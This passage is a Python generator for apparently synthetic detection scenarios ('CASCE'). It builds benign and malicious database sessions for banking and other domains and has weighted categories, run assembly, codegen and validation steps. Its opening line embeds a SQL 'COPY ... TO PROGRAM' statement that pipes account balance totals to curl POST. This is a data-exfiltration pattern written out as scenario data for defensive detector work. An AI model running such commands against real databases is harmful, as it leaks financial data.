                 "sql": f"COPY (SELECT a.branch_id, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.branch_id) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
                 "connects_to": {"ip": dest_ip, "port": dest_port}},
            ]
        }]
    }


# ==========================================================================
# Category registry and run assembly
# ==========================================================================

CATEGORY_GENERATORS = [
    # (generator_func, weight) — weight controls how often this category appears
    (_make_teller_routine_benign,       3),
    (_make_teller_pii_dump_malicious,   2),
    (_make_etl_benign,                  2),  # matched pair ↕
    (_make_etl_exfil_malicious,         2),  # matched pair ↕
    (_make_privilege_abuse_malicious,   2),
    (_make_compliance_audit_benign,     3),
    (_make_defense_impairment_malicious, 2),
    (_make_manager_eod_benign,          3),
    (_make_compliance_exfil_malicious,  2),
    (_make_multi_session_apt,           1),
    (_make_hard_neg_dba_shadow_audit,   1),
    (_make_hard_neg_etl_internal,       2),
    (_make_alter_role_escalation,       1),
    # --- New categories for diversity ---
    (_make_manager_cross_branch_benign, 2),
    (_make_data_tampering_malicious,    2),
    (_make_lateral_movement_malicious,  1),
    (_make_batch_report_benign,         2),
]


def _weighted_choices(rng, categories, n):
    """Pick n categories from the weighted list."""
    funcs, weights = zip(*categories)
    total = sum(weights)
    probs = [w / total for w in weights]
    return rng.choices(funcs, weights=probs, k=n)


def _is_etl_benign(func) -> bool:
    if func is _make_etl_benign:
        return True
    return getattr(func, '__wrapped_original__', None) is _dk_etl_benign


def _is_etl_malicious(func) -> bool:
    if func is _make_etl_exfil_malicious:
        return True
    return getattr(func, '__wrapped_original__', None) is _dk_etl_exfil_mal


def _get_func_domain(func) -> str:
    return getattr(func, '__domain__', None) or "banking"


def _build_domain_helpers(generators):
    """Group ETL pairs and benign replacements by domain."""
    etl_ben_by_domain = {}
    etl_mal_by_domain = {}
    replacements_by_domain = defaultdict(list)

    banking_fallbacks = [_make_teller_routine_benign, _make_compliance_audit_benign, _make_manager_eod_benign]

    for func, _ in generators:
        dom = _get_func_domain(func)
        if _is_etl_benign(func):
            etl_ben_by_domain[dom] = func
        elif _is_etl_malicious(func):
            etl_mal_by_domain[dom] = func
        else:
            orig = getattr(func, '__wrapped_original__', None)
            if dom == "banking":
                if func in banking_fallbacks:
                    replacements_by_domain[dom].append(func)
            else:
                if orig in (_dk_frontline_benign, _dk_audit_benign, _dk_senior_benign):
                    replacements_by_domain[dom].append(func)

    # Fallback if specific replacements weren't captured
    for dom in list(etl_mal_by_domain.keys()) + list(etl_ben_by_domain.keys()):
        if not replacements_by_domain[dom]:
            dom_funcs = [f for f, _ in generators if _get_func_domain(f) == dom and not _is_etl_malicious(f)]
            if dom_funcs:
                replacements_by_domain[dom] = dom_funcs

    return etl_ben_by_domain, etl_mal_by_domain, replacements_by_domain


def generate_run(run_dir: Path, rng: random.Random,
                 scenarios_per_run: int = 20,
                 category_generators: List = None) -> List[dict]:
    """Generate one run directory with specs/*.yaml files.
    
    Args:
        run_dir: Directory to write specs into.
        rng: Random instance for reproducibility.
        scenarios_per_run: Number of scenarios to generate.
        category_generators: Optional list of (gen_func, weight) tuples.
            If None, uses the banking CATEGORY_GENERATORS.
    
    Returns list of generated spec dicts.
    """
    specs_dir = run_dir / "specs"
    specs_dir.mkdir(parents=True, exist_ok=True)

    generators = category_generators or CATEGORY_GENERATORS

    # Pick categories for this run
    chosen = _weighted_choices(rng, generators, scenarios_per_run)

    # Identify ETL pairs and replacements per domain
    etl_ben_by_dom, etl_mal_by_dom, repls_by_dom = _build_domain_helpers(generators)

    specs = []
    # Track matched pair indices per domain
    pair_indices = defaultdict(int)

    # Handle matched pairs: ETL benign/malicious must be generated together
    i = 0
    scenario_counter = 0
    while i < len(chosen):
        gen = chosen[i]
        scenario_counter += 1
        dom = _get_func_domain(gen)

        if _is_etl_benign(gen):
            # Generate the matched pair together for this domain
            pair_indices[dom] += 1
            p_idx = pair_indices[dom]
            spec_ben = gen(rng, p_idx)
            etl_mal = etl_mal_by_dom.get(dom)
            if etl_mal is not None:
                spec_mal = etl_mal(rng, p_idx)
                specs.extend([spec_ben, spec_mal])
            else:
                specs.append(spec_ben)
            i += 1
            continue
        elif _is_etl_malicious(gen):
            # Skip — standalone malicious ETL would leave an orphaned matched_pair_id.
            # Generate a replacement benign scenario from the same domain instead.
            dom_repls = repls_by_dom.get(dom)
            if dom_repls:
                replacement = rng.choice(dom_repls)
                spec = replacement(rng, scenario_counter + 1000)
                specs.append(spec)
            i += 1
            continue

        spec = gen(rng, scenario_counter)
        specs.append(spec)
        i += 1

    # Write YAML files
    import yaml
    for spec in specs:
        fname = f"{spec['scenario_id']}.yaml"
        with (specs_dir / fname).open("w") as f:
            yaml.dump(spec, f, default_flow_style=False, sort_keys=False,
                      allow_unicode=True, width=200)

    return specs


def codegen_run(run_dir: Path, gen_date: str = None) -> bool:
    """Run codegen.py on a run directory. Returns True on success."""
    cmd = [sys.executable, str(_REPO_ROOT / "datagen" / "codegen.py"), str(run_dir)]
    if gen_date:
        cmd.extend(["--date", gen_date])
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(_REPO_ROOT))
    if result.returncode != 0:
        print(f"  ✗ codegen FAILED: {run_dir.name}", file=sys.stderr)
        print(f"    {result.stderr.strip()}", file=sys.stderr)
        return False
    print(f"  ✓ codegen OK: {result.stdout.strip()}")
    return True


def validate_run(run_dir: Path) -> bool:
    """Run validate_run.py on a run directory. Returns True on success."""
    cmd = [sys.executable, str(_REPO_ROOT / "datagen" / "validate_run.py"), str(run_dir)]
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(_REPO_ROOT))
    if result.returncode != 0:
        print(f"  ✗ validate FAILED: {run_dir.name}", file=sys.stderr)
        print(f"    {result.stderr.strip()}", file=sys.stderr)
        return False
    print(f"  ✓ validate OK: {run_dir.name}")
    return True


# ==========================================================================
# CLI
# ==========================================================================

def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Generate spec-driven synthetic CASCE scenarios")
    parser.add_argument("--out", required=True,
                        help="Output base directory")
    parser.add_argument("--runs", type=int, default=10,
                        help="Number of independent run directories (default 10)")
    parser.add_argument("--scenarios-per-run", type=int, default=20,
                        help="Scenarios per run directory (default 20)")
    parser.add_argument("--date", default=None,
                        help="Generation date YYYY-MM-DD (default: today)")
    parser.add_argument("--seed", type=int, default=42,
                        help="Random seed (default 42)")
    parser.add_argument("--skip-validate", action="store_true",
                        help="Skip validate_run.py (for debugging)")
    parser.add_argument("--domain", default="banking",
                        choices=["banking", "healthcare", "ecommerce", "logistics", "all"],
                        help="Domain to generate scenarios for (default: banking). "
                             "'all' mixes all domains within each run.")
    args = parser.parse_args(argv)

    out_base = Path(args.out)
    out_base.mkdir(parents=True, exist_ok=True)

    rng = random.Random(args.seed)
    total_scenarios = 0
    total_sessions = 0
    successful_runs = 0
    failed_runs = 0
    category_counts = defaultdict(int)
    class_counts = {"benign": 0, "malicious": 0}
    re_counts = defaultdict(int)

    # Build domain generator lookup
    domain_generators = {}
    for d in ALL_DOMAINS:
        if d == "banking":
            domain_generators[d] = CATEGORY_GENERATORS
        else:
            domain_generators[d] = get_domain_category_generators(d)

    # For --domain all, we'll build a mixed generator list per run
    if args.domain == "all":
        # Combine all domain generators into one big weighted list
        all_generators = []
        for d in ALL_DOMAINS:
            all_generators.extend(domain_generators[d])
        selected_generators = all_generators
        domain_label = "all (banking+healthcare+ecommerce+logistics)"
    else:
        selected_generators = domain_generators[args.domain]
        domain_label = args.domain

    print(f"\n{'='*60}")
    print(f"  CASCE Scenario Generator v2")
    print(f"  Output: {out_base}")
    print(f"  Domain: {domain_label}")
    print(f"  Runs: {args.runs} × {args.scenarios_per_run} scenarios")
    print(f"  Seed: {args.seed}")
    print(f"{'='*60}\n")

    for run_idx in range(1, args.runs + 1):
        run_dir = out_base / f"run_{run_idx:03d}"
        print(f"\n--- Run {run_idx}/{args.runs}: {run_dir.name} ---")

        specs = generate_run(run_dir, rng, args.scenarios_per_run,
                             category_generators=selected_generators)

        # Stats
        for spec in specs:
            total_scenarios += 1
            for sess in spec.get("sessions", []):
                total_sessions += 1
                cls = sess.get("class") or spec.get("default_class", "unknown")
                class_counts[cls] = class_counts.get(cls, 0) + 1
            re = spec.get("rule_engine_relationship", "agrees")
            re_counts[re] += 1

        # Run codegen
        if not codegen_run(run_dir, args.date):
            failed_runs += 1
            continue

        # Run validation
        if not args.skip_validate:
            if not validate_run(run_dir):
                failed_runs += 1
                continue

        successful_runs += 1

    # Summary
    print(f"\n{'='*60}")
    print(f"  GENERATION SUMMARY")
    print(f"{'='*60}")
    print(f"  Runs:      {successful_runs} successful, {failed_runs} failed")
    print(f"  Scenarios: {total_scenarios}")
    print(f"  Sessions:  {total_sessions}")
    print(f"  Classes:   {dict(class_counts)}")
    print(f"  Rule-engine relationship distribution:")
    for re_type, count in sorted(re_counts.items()):
        print(f"    {re_type}: {count}")

    # Uniqueness check: count distinct family_ids
    all_families = set()
    for run_idx in range(1, args.runs + 1):
        run_dir = out_base / f"run_{run_idx:03d}"
        manifest_file = run_dir / "expectation_manifest.json"
        if manifest_file.exists():
            with open(manifest_file) as f:
                manifest = json.load(f)
            for sid, sdata in manifest.get("scenarios", {}).items():
                all_families.add(sdata.get("family_id", sid))
    print(f"  Unique families: {len(all_families)}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
